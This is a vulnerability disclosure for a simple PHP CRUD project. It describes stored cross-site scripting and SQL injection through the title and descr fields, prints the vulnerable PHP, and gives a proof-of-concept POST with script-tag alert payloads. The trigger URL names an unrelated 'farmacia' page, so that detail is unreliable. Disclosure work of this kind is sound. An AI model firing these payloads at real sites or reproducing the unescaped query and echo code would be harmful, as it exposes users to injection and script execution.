# simple-crud-functionality-in-php has Cross Site Scripting vulnerability in index.php

## supplier 
https://code-projects.org/simple-crud-functionality-in-php-with-source-code/
## Vulnerability file
index.php

## describe
there are unrestricted cross site scripting attacks and injection attacks in the simple-crud-functionality-in-php in index.php. The controllable parameters are as follows: descr parameter and title parameter. This function will execute the user parameter without restriction into the echo statement. Malicious attackers can exploit this vulnerability to obtain sensitive information from clients

**Code analysis**    

Line 21-36 in edit.php
```
if(isset($_POST['sub'])){

    if(isset($_POST['srno'])){
        $srno = $_POST['srno'];
        $newtitle = $_POST['newtitle'];
        $newdescr = $_POST['newdescr'];

        $sqledit = "UPDATE `crud`.`notes` SET `Sr.No` = $srno, `title` = '$newtitle', `descr` = '$newdescr', `Time` = NOW() WHERE `notes`.`Sr.No` = $srno;";

        mysqli_query($con, $sqledit);

        header("Location: ./index.php");

mysqli_close($con);
    }
}
```
Updating user's input directly into database without any restrictions.  
Line 63-73 in index.php
```
        echo " <tr>
        <td>".$row['Sr.No']."</td>
        <td>".$row['']."</td>
        <td>".$row['descr']."</td>
        <td>".$row['Time']."</td>
        <td>
         <a href='edit.php'><button name='edit' class='sub'>Edit</button></a>
             <a href='delete.php'><button type='submit' name='delete' class='sub'>Delete</button></a>
           
        </td>
    </tr>";
```
Querying data from the database use echo function to output, with the parameter descr and title not filtered, resulting in the execution of XSS statements.

## POC

```
POST /edit.php HTTP/1.1
Host: localhost:8081
Content-Length: 109
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="131", "Not_A Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Origin: http://localhost:8081
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8081/edit.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

srno=1&newtitle=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&newdescr=%3Cscript%3Ealert%282%29%3C%2Fscript%3E&sub=

```
For title parameter, the test payload is `<script>alert(1)</script>`  
For desrc parameter, the test payload is `<script>alert(2)</script>`  
Visit this URL to trigger the cross-site scripting vulnerability.

```
http://farmacia/adicionar-produto.php
```

**Result**

For parameter "title":  
![image-20241128083927477](https://raw.githubusercontent.com/LamentXU123/cve/refs/heads/main/assest/xss3.png)  
For parameter "descr":  
![image-20241128083927477](https://raw.githubusercontent.com/LamentXU123/cve/refs/heads/main/assest/xss3_2.png) 
